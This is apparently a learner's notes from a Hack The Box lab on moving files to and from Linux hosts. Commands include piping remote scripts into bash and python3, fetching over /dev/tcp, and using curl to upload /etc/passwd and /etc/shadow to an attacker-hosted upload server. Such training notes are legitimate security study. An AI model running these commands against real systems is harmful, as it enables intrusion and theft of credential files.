...
```shell-session
0xxNosystemisSafe@htb[/htb]$ echo -n '' | base64 -d > id_rsa
```
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```
the flag `-qO-` is a combined flag which is enables quite mode which will only show the actual data no status bar or other infomation other than the actual data and -O- will send the output to std-output not in a file so when piping it is nessaccary to use these flags with wget 
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

#### HTTP GET Request

```shell-session
0xxNosystemisSafe@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Print the Response

```shell-session
0xxNosystemisSafe@htb[/htb]$ cat <&3
```
**optional**=> i bumped into block size of file system and disk and how it will confuse u [[diff in file system block and disk blocks]]
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ sudo systemctl enable ssh
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ sudo systemctl start ssh
```

#### Checking for SSH Listening Port

```shell-session
0xxNosystemisSafe@htb[/htb]$ netstat -lnpt
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```
...
```shell
0xxNosystemisSafe@htb[/htb]$ sudo python3 -m pip install --user uploadserver
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ mkdir https && cd https
```

```shell-session
0xxNosystemisSafe@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

##### EXPLANATION OF THE ABOVE COMMANDS [[-F = Multipart Form-data]]
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ python3 -m http.server
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ python2.7 -m SimpleHTTPServer
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ php -S 0.0.0.0:8000
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ ruby -run -ehttpd . -p8000
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
